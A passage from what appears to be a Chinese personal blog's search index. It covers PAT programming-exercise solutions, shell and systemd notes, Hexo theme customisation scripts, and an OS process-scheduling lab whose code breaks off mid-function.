个非负整数（均不超过 1 百万），其中第 i 个整数为第 i 种月饼的销量（块）。数字间以空格分隔。 输出格式： 在第一行中输出最大销量，第二行输出销量最大的月饼的种类编号。如果冠军不唯一，则按编号递增顺序输出并列冠军。数字间以 1 个空格分隔，行首尾不得有多余空格。 输入样例：5 3 1001 992 0 233 6 8 0 2018 0 2008 36 18 0 1024 4 输出样例：2018 3 5 通过代码12345678910111213141516171819202122232425#include &lt;stdio.h&gt;int main() { int n, m, max = -10000, count = 0, temp; scanf(&quot;%d%d&quot;, &amp;n, &amp;m); int sale[n] = {0}; for (int i = 0; i &lt; m - 1; i++) { for (int j = 0; j &lt; n; j++) { scanf(&quot;%d&quot;, &amp;temp); sale[j] += temp; } } for (int i = 0; i &lt; n; i++) { scanf(&quot;%d&quot;, &amp;temp); sale[i] += temp; if (sale[i] &gt; max) max = sale[i]; } printf(&quot;%d\\n&quot;, max); for (int i = 0; i &lt; n; i++) { if (sale[i] == max) { if (count++ == 0) printf(&quot;%d&quot;, i + 1); else printf(&quot;%s%d&quot;, &quot; &quot;, (i + 1)); } } return 0;} 评价与反思没有难度，按照题意统计计算就好","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1092-%E6%9C%80%E5%A5%BD%E5%90%83%E7%9A%84%E6%9C%88%E9%A5%BC(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1093","text":"题目 给定两个字符串 A 和 B，本题要求你输出 A+B，即两个字符串的并集。要求先输出 A，再输出 B，但重复的字符必须被剔除。 输入格式： 输入在两行中分别给出 A 和 B，均为长度不超过 106的、由可见 ASCII 字符 (即码值为32~126)和空格组成的、由回车标识结束的非空字符串。 输出格式： 在一行中输出题面要求的 A 和 B 的和。 输入样例：12This is a sample testto show you_How it works 输出样例：1This ampletowyu_Hrk 通过代码123456789101112131415#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main () { char arr[128] = {0}; memset(arr, -1, sizeof(arr)); char c; while ((c = getchar()) != -1) { if (c == '\\n') continue; if (arr[c] == -1) { putchar(c); arr[c] = 1; } }} 思路与注意 观察输入与输出 换行不输出 某个字符如果前面出现过，就不输出 搞一个数组，ASCII值为引索，初始化为-1，每打一个字，把对应的值改成非-1的值 注意要让程序结束，通过第二个回车判断，或者EOF 的-1判断","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1093-%E5%AD%97%E7%AC%A6%E4%B8%B2A+B(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1094","text":"题目 2004 年 7 月，谷歌在硅谷的 101 号公路边竖立了一块巨大的广告牌（如下图）用于招聘。内容超级简单，就是一个以 .com 结尾的网址，而前面的网址是一个 10 位素数，这个素数是自然常数 e 中最早出现的 10 位连续数字。能找出这个素数的人，就可以通过访问谷歌的这个网站进入招聘流程的下一步。 自然常数 e 是一个著名的超越数，前面若干位写出来是这样的：e = 2.718281828459045235360287471352662497757247093699959574966967627724076630353547594571382178525166427427466391932003059921… 其中粗体标出的 10 位数就是答案。 本题要求你编程解决一个更通用的问题：从任一给定的长度为 L 的数字中，找出最早出现的 K 位连续数字所组成的素数。 输入格式： 输入在第一行给出 2 个正整数，分别是 L（不超过 1000 的正整数，为数字长度）和 K（小于 10 的正整数）。接下来一行给出一个长度为 L 的正整数 N。 输出格式： 在一行中输出 N 中最早出现的 K 位连续数字所组成的素数。如果这样的素数不存在，则输出 404。注意，原始数字中的前导零也计算在位数之内。例如在 200236 中找 4 位素数，0023 算是解；但第一位 2 不能被当成 0002 输出，因为在原始数字中不存在这个 2 的前导零。 输入样例 1：1220 523654987725541023819 输出样例 1：149877 输入样例 2：1210 32468024680 输出样例 2：1404 通过代码1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;bool isPrime[10] = {false, false, true, true, false, true, false, true, false};bool Prime(int i) { if (i &lt; 9 &amp;&amp; i &gt;= 0) return isPrime[i]; if (i % 2 == 0) return false; else for (int j = 3; j * j &lt;= i; j += 2)//只能&gt;=9的奇数 if (i % j == 0) return false; return true;}int main () { int a, b; string bf; bool ok = false; cin &gt;&gt; a &gt;&gt; b &gt;&gt; bf; for (int i = 0; i &lt;= a - b; i++) { string n = bf.substr(i, b); int x = atoi(n.data()); if (Prime(x)) { printf (&quot;%s\\n&quot;, n.data()); ok = true; break; } } if (!ok) printf (&quot;404\\n&quot;); return 0;} 思路与注意 按照题意算就可以，注意需要判断哪个是素数再算哪个 反思与评价 这道题不难，但是写了一个下午，因为脑袋很轴，非要把所有0~`999999999`的素数全算出来","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1094-%E8%B0%B7%E6%AD%8C%E7%9A%84%E6%8B%9B%E8%81%98(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1095","text":"题目 PAT 准考证号由 4 部分组成： 第 1 位是级别，即 T 代表顶级；A 代表甲级；B 代表乙级； 第 2~4 位是考场编号，范围从 101 到 999； 第 5~10 位是考试日期，格式为年、月、日顺次各占 2 位； 最后 11~13 位是考生编号，范围从 000 到 999。 现给定一系列考生的准考证号和他们的成绩，请你按照要求输出各种统计信息。 输入格式： 输入首先在一行中给出两个正整数 N（≤104）和 M（≤100），分别为考生人数和统计要求的个数。 接下来 N 行，每行给出一个考生的准考证号和其分数（在区间 [0,100] 内的整数），其间以空格分隔。 考生信息之后，再给出 M 行，每行给出一个统计要求，格式为：类型 指令，其中 类型 为 1 表示要求按分数非升序输出某个指定级别的考生的成绩，对应的 指令 则给出代表指定级别的字母； 类型 为 2 表示要求将某指定考场的考生人数和总分统计输出，对应的 指令 则给出指定考场的编号； 类型 为 3 表示要求将某指定日期的考生人数分考场统计输出，对应的 指令 则给出指定日期，格式与准考证上日期相同。 输出格式： 对每项统计要求，首先在一行中输出 Case #: 要求，其中 # 是该项要求的编号，从 1 开始；要求 即复制输入给出的要求。随后输出相应的统计结果： 类型 为 1 的指令，输出格式与输入的考生信息格式相同，即 准考证号 成绩。对于分数并列的考生，按其准考证号的字典序递增输出（题目保证无重复准考证号）； 类型 为 2 的指令，按 人数 总分 的格式输出； 类型 为 3 的指令，输出按人数非递增顺序，格式为 考场编号 总人数。若人数并列则按考场编号递增顺序输出。 如果查询结果为空，则输出 NA。 输入样例：123456789101112138 4B123180908127 99B102180908003 86A112180318002 98T107150310127 62A107180908108 100T123180908010 78B112160918035 88A107180908021 981 A2 1073 1809082 999 输出样例：123456789101112Case 1: 1 AA107180908108 100A107180908021 98A112180318002 98Case 2: 2 1073 260Case 3: 3 180908107 2123 2102 1Case 4: 2 999NA 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#define map unordered_map#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;struct POS { int Num = 0; int Score = 0;};struct STU { string id; int score;};typedef pair&lt;string, POS&gt; PAIR;map&lt;string, POS&gt; Pos;map&lt;char, vector&lt;STU&gt;&gt; type;map&lt;string, POS&gt; PosWithTime;vector&lt;PAIR&gt; vPosWithTime;void update(STU* ob) { string pos = ob-&gt;id.substr(1, 3); Pos[pos].Num++; Pos[pos].Score += ob-&gt;score; pos = ob-&gt;id.substr(1, 9); PosWithTime[pos].Num++; PosWithTime[pos].Score++; type[ob-&gt;id[0]].push_back(*ob);}bool cmp1(STU&amp; a, STU&amp; b) { return (a.score != b.score ? a.score &gt; b.score : a.id &lt; b.id);}bool cmp2(PAIR&amp; a, PAIR&amp; b) { return (a.second.Num != b.second.Num ? a.second.Num &gt; b.second.Num : a.first &lt; b.first);}void final() { for (map&lt;char, vector&lt;STU&gt;&gt;::iterator ite = type.begin(); ite != type.end(); ite++) sort(ite-&gt;second.begin(), ite-&gt;second.end(), cmp1); for (map&lt;string, POS&gt;::iterator ite = PosWithTime.begin(); ite != PosWithTime.end(); ite++) vPosWithTime.push_back(*ite); sort(vPosWithTime.begin(), vPosWithTime.end(), cmp2);}int one(int num) { char grade; cin &gt;&gt; grade; printf(&quot;Case %d: 1 %c\\n&quot;, num, grade); vector&lt;STU&gt;&amp; temp = type[grade]; if (!temp.size()) return 1; for (int i = 0; i &lt; temp.size(); i++) printf(&quot;%s %d\\n&quot;, temp[i].id.data(), temp[i].score); return 0;}int two(int num) { string pos; cin &gt;&gt; pos; printf(&quot;Case %d: 2 %s\\n&quot;, num, pos.data()); POS&amp; temp = Pos[pos]; if (!temp.Num) return 1; printf(&quot;%d %d\\n&quot;, temp.Num, temp.Score); return 0;}int three(int num) { string date; cin &gt;&gt; date; printf(&quot;Case %d: 3 %s\\n&quot;, num, date.data()); int n = 0; for (vector&lt;PAIR&gt;::iterator ite = vPosWithTime.begin(); ite != vPosWithTime.end(); ite++) { if (ite-&gt;first.substr(3, 6) == date) { printf(&quot;%s %d\\n&quot;, ite-&gt;first.substr(0, 3).data(), ite-&gt;second.Num); n++; } } if (!n) return 1; return 0;}int main() { int n, m; scanf(&quot;%d%d&quot;, &amp;n, &amp;m); STU temp; for (int i = 0; i &lt; n; i++) { char str[1024]; scanf (&quot;%s%d&quot;, str, &amp;temp.score); temp.id = str; update(&amp;temp); } final(); for (int i = 0; i &lt; m; i++) { int ins, result; scanf (&quot;%d&quot;, &amp;ins); getchar(); if (ins == 1) result = one(i + 1); else if (ins == 2) result = two(i + 1); else result = three(i + 1); if (result) printf(&quot;NA\\n&quot;); } return 0;} 思路与注意 建立两个结构体 考场POS，储存考场人数Num，所有人的总分Score 学生STU，储存考号id，分数score 建立三个映射map Pos考场号（string）-&gt;考场（POS），给第二个功能用的，引索是考场号 type等级（char）-&gt;学生（STU）向量（vector），每个等级对应一个vector PosWithTime考场号+时间（string）-&gt;考场（POS），引索是考场+时间，这样可以保证是某一天的某教室的人数。 不单独创建vector储存学生信息，每次输入后，利用updata()函数，向以上三个映射map中更新数据（增加POS 的Score、某一等级的学生信息） 最后一次性把所有数据全部排好序（利用final()函数）（vPosWithTime就是为了给PosWithTime排序的）（type这个map中的所有vector按照要求排序），防止数据反复拷贝、遍历。 每个功能一个函数，计算输出 使用printf和scanf，防止后两个测试点超时 反思与评价这道题写了一下午，主要犯了以下错误 逻辑问题。对于类型二的输出，没有考虑到一间考场可以对应多场考试。刚开始想要用类，搞一个类的静态变量（从考场号到考场结构体变量的map映射），在一遍输入，一边构造了对象，就利用该对象的数据进行分析，然后统计。这时犯了逻辑错误，认为这个map统计的考生数就是某一天的考生数。本地运行的时候也没注意检查。 阅读问题。这两道题的最后两个测试点一直超时（之前使用cin，cout的时候），然后去看了csdn上一位大佬的代码。没发现跟自己的算法的区别。后来仔细读了TA的文章后，才反应过来是由于cin和cout的巴拉巴拉巴拉的原因。然后我把所有的cin和cout换成printf和scanf，就不超时了。 真·真开心！（不认识“真”了）","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1095-%E8%A7%A3%E7%A0%81PAT%E5%87%86%E8%80%83%E8%AF%81(PAT-(Basic-Level)-Practice)/"},{"title":"shell的使用","text":"shell fuction函数定义 定义1xxx.sh123function funcName() { # do sth} 定义2xxx.sh1234f2() { value=$(($1+$2+1)) echo $1 &quot;+&quot; $2 &quot;=&quot; $value} 传参xxx.sh1234function funcName() { echo $1 # 打印第一个参数 echo $2 # 打印第二个参数} 调用 直接在脚本中调用 xxx.sh12345function funcName() { echo $1 # 打印第一个参数 echo $2 # 打印第二个参数}funcName 刘喵喵 大帅哥 在shell中调用 shell12. xxx.sh # import导入其中的函数funcName 刘喵喵 大帅哥 如果function写在/etc/profile、~/.bashrc下，则可以直接调用 应用 有了以上方法，在bashrc中将自己常用但容易遗忘的命令写成函数，就可以方便的调用了 如果函数忘了，，那就可以去~/.bashrc下看看😅x1 如果忘记去哪里看了，，，那就来看看这篇文章😅x2 如果忘记这篇文章，，，那我直接😅x3 ~/.bashrc12345678function setgitproxy() { git config --global http.proxy 'socks5h://localhost:7890' git config --global https.proxy 'socks5h://localhost:7890'}function unsetgitproxy() { git config --global --unset http.proxy git config --global --unset https.proxy} ubuntu中创建unitsystemctlsystemctl 提供了一组子命令来管理单个的 unit，其命令格式为： 1systemctl [command] [unit] 创建unit 编写.service文件1sudo vim /etc/systemd/system/xxx.service xxx.service1234567891011[Unit]Description=clash daemon[Service]Type=simpleUser=rootExecStart=/opt/xxx/xxx -d /etc/xxx/ #start时执行的命令Restart=on-failure[Install]WantedBy=multi-user.target 重新加载systemctl daemon 1sudo systemctl daemon-reload 启动service 1sudo systemctl start xxx.service 设置为开机启动 1sudo systemctl enable xxx.service","link":"/home/2022/10/27/linux/shell/"},{"title":"显卡驱动踩坑","text":"nvidia显卡驱动踩坑 之前更新了一次linux的内核，导致内核的显卡冲突了，hdmi没有输出，nvidia-smi命令也没了 重装了nvidia的显卡，发现默认使用核显，动画非常卡 后来屏蔽了linux自带的驱动nouveau，hdmi终于有输出了，显卡驱动的daemon也可以使用了(nvidia-smi输出正常)，但是自带的显示器却不能用了 解决方法 /etc/X11/xorg.conf文件不知道什么原因出现了错误，把这个文件内容清空，就好了 重启后发现这个文件里面本身就没东西","link":"/home/2022/10/28/linux/%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E8%B8%A9%E5%9D%91/"},{"title":"hexo配置&amp;踩坑&amp;自定义","text":"git deplyerref 文章目录 icarus的文章目录只有二级标题开始才可以跳转 阅读更多按钮 安装hexo-excerpt插件 live2d 安装这个hexo-helper-live2d 代码块123{% codeblock filename lang:code-lang %} your code here...{% endcodeblock %} gittalk 按照教程创建gittalk，填写配置文件 官方教程 注意这里的repo是仓库名字，不是repo的url，不是repo的名称 通过f12的network发现发送的是apiurl+repo _config.icaruc.yml12345678910111213141516comment: type: gitalk client_id: xxxxxxxxxxxxxxxxxxxx client_secret: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx repo: Some-of-Your-GitHub-Repo # 这里是repo的名字，不是url owner: you_github_name admin: - you_github_name per_page: 20 # 可选填 distraction_free_mode: false # 可选填 pager_direction: last # 可选填 create_issue_manually: false # 可选填 proxy: # 可选填 flip_move_options: # 可选填 enable_hotkey: true # 可选填 language: zh-CN # 可选填 同时，在_config.yml下配置gitalk _config.yml12345678gitalk: enable: true #默认的是false，没有打开 owner: 'github name' repo: 'repo name' oauth: clientId: 'clientId' clientSecret: 'clientSecret' admin: ['githubname'] fairyDust 鼠标特效在source/js下创建文件fairyDustCursor.js source/js/fairyDustCursor.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123(function fairyDustCursor() { var possibleColors = [&quot;#D61C59&quot;, &quot;#E7D84B&quot;, &quot;#1B8798&quot;] var width = window.innerWidth; var height = window.innerHeight; var cursor = { x: width / 2, y: width / 2 }; var particles = []; function init() { bindEvents(); loop(); } // Bind events that are needed function bindEvents() { document.addEventListener('mousemove', onMouseMove); document.addEventListener('touchmove', onTouchMove); document.addEventListener('touchstart', onTouchMove); window.addEventListener('resize', onWindowResize); } function onWindowResize(e) { width = window.innerWidth; height = window.innerHeight; } function onTouchMove(e) { if (e.touches.length &gt; 0) { for (var i = 0; i &lt; e.touches.length; i++) { addParticle(e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random() * possibleColors.length)]); } } } function onMouseMove(e) { cursor.x = e.clientX; cursor.y = e.clientY; addParticle(cursor.x, cursor.y, possibleColors[Math.floor(Math.random() * possibleColors.length)]); } function addParticle(x, y, color) { var particle = new Particle(); particle.init(x, y, color); particles.push(particle); } function updateParticles() { for (var i = 0; i &lt; particles.length; i++) { particles[i].update(); } for (var i = particles.length - 1; i &gt;= 0; i--) { if (particles[i].lifeSpan &lt; 0) { particles[i].die(); particles.splice(i, 1); } } } function loop() { requestAnimationFrame(loop); updateParticles(); } function Particle() { this.character = &quot;*&quot;; this.lifeSpan = 120; //ms this.initialStyles = { &quot;position&quot;: &quot;fixed&quot;, &quot;top&quot;: &quot;0&quot;, //必须加 &quot;display&quot;: &quot;block&quot;, &quot;pointerEvents&quot;: &quot;none&quot;, &quot;z-index&quot;: &quot;10000000&quot;, &quot;fontSize&quot;: &quot;20px&quot;, &quot;will-change&quot;: &quot;transform&quot; }; this.init = function (x, y, color) { this.velocity = { x: (Math.random() &lt; 0.5 ? -1 : 1) * (Math.random() / 2), y: 1 }; this.position = { x: x - 10, y: y - 20 }; this.initialStyles.color = color; console.log(color); this.element = document.createElement('span'); this.element.innerHTML = this.character; applyProperties(this.element, this.initialStyles); this.update(); document.body.appendChild(this.element); }; this.update = function () { this.position.x += this.velocity.x; this.position.y += this.velocity.y; this.lifeSpan--; this.element.style.transform = &quot;translate3d(&quot; + this.position.x + &quot;px,&quot; + this.position.y + &quot;px,0) scale(&quot; + (this.lifeSpan / 120) + &quot;)&quot;; } this.die = function () { this.element.parentNode.removeChild(this.element); } } function applyProperties(target, properties) { for (var key in properties) { target.style[key] = properties[key]; } } init();})(); 修改node_modules/hexo-theme-icarus/layout下的layout.jsx，在body中引用这个js文件 node_modules/hexo-theme-icarus/layout/layout.jsx1&lt;script type=&quot;text/javascript&quot; src=&quot;/home/js/fairyDustCursor.js&quot;&gt;&lt;/script&gt; 点击特效编写产生点击特效的js文件 source/js/textPopup.js12345678910111213141516171819202122232425262728293031323334var colors = new Array(&quot;#FF0000&quot;,&quot;#FF7F00&quot;,&quot; #FFFF00&quot;,&quot;#00FF00&quot;,&quot;#00FFFF&quot;,&quot;#0000FF&quot;,&quot;#8B00FF&quot;,&quot;#FF0000&quot;,&quot;#FF7F00&quot;,&quot; #FFFF00&quot;,&quot;#00FF00&quot;,&quot;#00FFFF&quot;,&quot;#0000FF&quot;,&quot;#8B00FF&quot;);var fnTextPopup = function (arr, options) { // arr参数是必须的 if (!arr || !arr.length) { return; } // 主逻辑 var index = 0; document.documentElement.addEventListener('click', function (event) { var x = event.pageX, y = event.pageY; var eleText = document.createElement('span'); eleText.className = 'text-popup'; this.appendChild(eleText); if (arr[index]) { eleText.innerHTML = arr[index]; } else { index = 0; eleText.innerHTML = arr[0]; } // 动画结束后删除自己 eleText.addEventListener('animationend', function () { eleText.parentNode.removeChild(eleText); }); // 位置 eleText.style.left = (x - eleText.clientWidth / 2) + 'px'; eleText.style.top = (y - eleText.clientHeight) + 'px'; //设置颜色 eleText.style.color = colors[index%14] // index递增 index++; });};fnTextPopup(['富强', '民主', '文明', '和谐', '自由', '平等', '公正', '法治', '爱国', '敬业', '诚信', '友善']); 编写css文件 source/css/textPopup.css123456789101112131415161718.text-popup { animation: textPopup 1s; user-select: none; white-space: nowrap; position: absolute; z-index: 99;}@keyframes textPopup { 0%, 100% { opacity: 0; } 5% { opacity: 1; } 100% { transform: translateY(-50px); }} 在layout.jsx中引用 node_modules/hexo-theme-icarus/layout/layout.jsx12&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/home/css/textPopup.css&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/home/js/textPopup.js&quot;&gt;&lt;/script&gt; RSS生成插件，增加RSS订阅按钮 安装一个插件，用来生成atom.xml文件 1npm install --save hexo-generator-feed 配置插件 head下增加rss配置_config.icarus.yml12head: rss: /atom.xml 增加对插件的配置_config.yml123456789# Extensionsplugins: hexo-generator-feed#Feed Atomfeed: type: atom path: atom.xml limit: 20rss: /atom.xml 配置RSS按钮_config.icarus.yml1234social_links: RSS: icon: fa fa-rss url: /atom.xml 优化RSS按钮上面配置点击rss按钮，如果浏览器没有安装rss相关插件，会直接显示atom.xml的原始样式，不美观，利用js实现点击rss按钮将订阅链接复制到剪切板 source/js/clickClipBoard.js123456789101112131415161718192021222324function copyToClipboard(text, callBack) { navigator.clipboard.writeText(text).then( value =&gt; { // fulfillment callBack() }, reason =&gt; { // rejection alert(&quot;fail: &quot; + reason) } )}$(document).ready(function() { var buttons = document.getElementsByClassName(&quot;button&quot;) for (let i = 0; i &lt; buttons.length; i++) { if (buttons[i].getAttribute(&quot;title&quot;) == &quot;RSS&quot;) { var url = document.baseURI + &quot;atom.xml&quot; buttons[i].href = &quot;javascript:;&quot; buttons[i].target = &quot;_self&quot; buttons[i].setAttribute('onclick', &quot;copyToClipboard(\\&quot;&quot; + url + &quot;\\&quot;, function() { alert(\\&quot;copied to clipboard\\&quot;) })&quot;) break } }}) 修复插件的问题 插件生成的xml文件中，博客的baseUrl不对，应该是jingtianer.github.io 它生成的是github.com/jingtianer 生成后使用脚本替换 其实是配置文件里写错了 deploy.sh1sed -i 's/github.com\\/jingtianer/jingtianer.github.io/g' public/atom.xml 代码块复制按钮优化 icarus的代码块复制按钮点击后只会选中代码，希望点击后能自动复制到剪切板 source/js/clickClipBoard.js12345678910111213141516171819202122232425262728293031323334353637function copyToClipboard(text, callBack) { navigator.clipboard.writeText(text).then( value =&gt; { // fulfillment callBack() }, reason =&gt; { // rejection alert(&quot;fail: &quot; + reason) } )}$(document).ready(function() { $(&quot;.copy&quot;).click(function() { copyCode(this) })})function copyCode(element) { if (element instanceof Element) { var elemt = element while(elemt.tagName != &quot;FIGURE&quot;) { elemt = elemt.parentElement } elemt = elemt.getElementsByClassName(&quot;code&quot;)[0] var text =elemt.innerText copyToClipboard(text, function() { var node = $(element.childNodes[0]) node.attr('class', &quot;fa fa-check&quot;) setTimeout(function () { node.attr('class', &quot;fas fa-copy&quot;) } ,1000) }) } } hexo-pdf 地址 usage1{% pdf ./bash_freshman.pdf %}","link":"/home/2022/10/26/misc/hexo%E9%85%8D%E7%BD%AE&%E8%B8%A9%E5%9D%91&%E8%87%AA%E5%AE%9A%E4%B9%89/"},{"title":"qq.md","text":"我的QQ123&quot;&quot;&quot; -... .- . -.. --. .... -.-. .--- -... -...&quot;&quot;&quot;","link":"/home/2022/10/22/social/qq/"},{"title":"实验-使用动态优先权的进程调度算法模拟","text":"1、实验目的通过动态优先权算法的模拟加深对进程概念进程调度过程的理解。 2、实验内容 用C语言来实现对N个进程采用动态优先权优先算法的进程调度。 每个用来标识进程的进程控制块PCB用结构来描述，包括以下字段： 进程标识数 ID。 进程优先数 PRIORITY，并规定优先数越大的进程，其优先权越高。 进程已占用的CPU时间CPUTIME。 进程还需占用的CPU时间ALLTIME。当进程运行完毕时，ALLTIME变为0。•••• 进程的阻塞时间STARTBLOCK，表示当进程再运行STARTBLOCK个时间片后，将进入阻塞状态。 进程被阻塞的时间BLOCKTIME，表示已足赛的进程再等待BLOCKTIME个时间片后，将转换成就绪状态。 进程状态START。 队列指针NEXT，用来将PCB排成队列。 优先数改变的原则： 进程在就绪队列中呆一个时间片，优先数加1。 进程每运行一个时间片，优先数减3。 假设在调度前，系统中有5个进程，它们的初始状态如下：1234567ID 0 1 2 3 4PRIORITY 9 38 30 29 0CPUTIME 0 0 0 0 0ALLTIME 3 3 6 3 4STARTBLOCK 2 -1 -1 -1 -1BLOCKTIME 3 0 0 0 0STATE READY READY READY READY READY 为了清楚的观察各进程的调度过程，程序应将每个时间片内的情况显示出来，参照的具体格式如下：1234567891011RUNNING PROG：iREADY-QUEUE：-〉id1-〉id2BLOCK-QUEUE：-〉id3-〉id4= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = == = =ID 0 1 2 3 4PRIORITY P0 P1 P2 P3 P4CUPTIME C0 C1 C2 C3 C4ALLTIME A0 A1 A2 A3 A4STARTBLOCK T0 T1 T2 T3 T4BLOCKTIME B0 B1 B2 B3 B4STATE S0 S1 S2 S3 S4 实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183#include&lt;queue&gt;#include&lt;iostream&gt;#include&lt;iomanip&gt; using namespace std;typedef int ID;typedef int Priority;typedef int Time;enum State { sready, sblocked, sruning, sstop};struct PCB{ ID id; Priority priority; Time cpu_time; Time all_time; Time start_block; Time block_time; State state; public: PCB( ID id0, Priority priority0, Time cpu_time0, Time all_time0, Time start_block0, Time block_time0, State state0 ): id(id0), priority(priority0), cpu_time(cpu_time0), all_time(all_time0), start_block(start_block0), block_time(block_time0), state(state0) { }};struct cmp //��д�º���{ bool operator() (PCB* a, PCB* b) { return a-&gt;priority &lt; b-&gt;priority; //�󶥶� }};typedef priority_queue&lt;PCB*, vector&lt;PCB*&gt;, cmp&gt; mqueue;const int width = 10;void show_PCB(PCB* pcb) { string state = &quot;&quot;; switch(pcb-&gt;state) { case sready: state = &quot;ready&quot;; break; case sblocked : state = &quot;blocked&quot;;break; case sruning : state = &quot;runing&quot;;break; case sstop: state = &quot;stop&quot;;break; defalut:state=&quot;unknown&quot;;break; } cout &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; pcb-&gt;id &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; pcb-&gt;priority &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; pcb-&gt;cpu_time &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; pcb-&gt;all_time &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; pcb-&gt;start_block &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; pcb-&gt;block_time &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; state &lt;&lt; &quot;|&quot; &lt;&lt; endl; }void show_queue(queue&lt;PCB*&gt; q){ cout &lt;&lt; left &lt;&lt; setw(7*width+7) &lt;&lt; setfill('-') &lt;&lt; &quot;&quot; &lt;&lt; &quot;\\n&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;id&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;priority&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;cpuTime&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;allTime&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;startBlock&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;blockTime&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;state&quot; &lt;&lt; &quot;|&quot; &lt;&lt; endl; while(!q.empty()) { PCB* t = q.front(); q.pop(); show_PCB(t); } cout &lt;&lt; left &lt;&lt; setw(7*width+7) &lt;&lt; setfill('-') &lt;&lt; &quot;&quot; &lt;&lt; &quot;\\n&quot;;}void show_queue(mqueue q){ cout &lt;&lt; left &lt;&lt; setw(7*width+7) &lt;&lt; setfill('-') &lt;&lt; &quot;&quot; &lt;&lt; &quot;\\n&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;id&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;priority&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;cpuTime&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;allTime&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;startBlock&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;blockTime&quot; &lt;&lt; &quot;|&quot; &lt;&lt; left &lt;&lt; setw(width) &lt;&lt; setfill(' ') &lt;&lt; &quot;state&quot; &lt;&lt; &quot;|&quot; &lt;&lt; endl; while(!q.empty()) { PCB* t = q.top(); q.pop(); show_PCB(t); } cout &lt;&lt; left &lt;&lt; setw(7*width+7) &lt;&lt; setfill('-') &lt;&lt; &quot;&quot; &lt;&lt; &quot;\\n&quot;;}queue&lt;PCB*&gt; finished;void run_a_time(mqueue&amp; ready,mqueue&amp; blocked,PCB* runing) { mqueue t_ready, t_blocked; runing = ready.top(); ready.pop(); runing-&gt;priority -= 3; runing-&gt;cpu_time += 1; runing-&gt;all_time -= 1; runing-&gt;start_block -= 1; if(runing-&gt;start_block == 0) { t_blocked.push(runing); runing-&gt;state = sruning; } else { if(runing-&gt;all_time &gt; 0) { t_ready.push(runing); } else { finished.push(runing); runing-&gt;state = sstop; } } mqueue t_queue = blocked; while(!t_queue.empty()) { PCB* t = t_queue.top(); t_queue.pop(); t-&gt;block_time -= 1; if(t-&gt;block_time == 0) { t_ready.push(t); t-&gt;block_time = 0; t-&gt;start_block = -1; t-&gt;state = sready; } else { t_blocked.push(t); t-&gt;state = sblocked; } } t_queue = ready; while(!t_queue.empty()) { PCB* t = t_queue.top(); t_queue.pop(); t-&gt;priority += 1; t-&gt;start_block -= 1; if(t-&gt;start_block == 0) { t_blocked.push(t); t-&gt;state = sblocked; } else { t_ready.push(t); t-&gt;state = 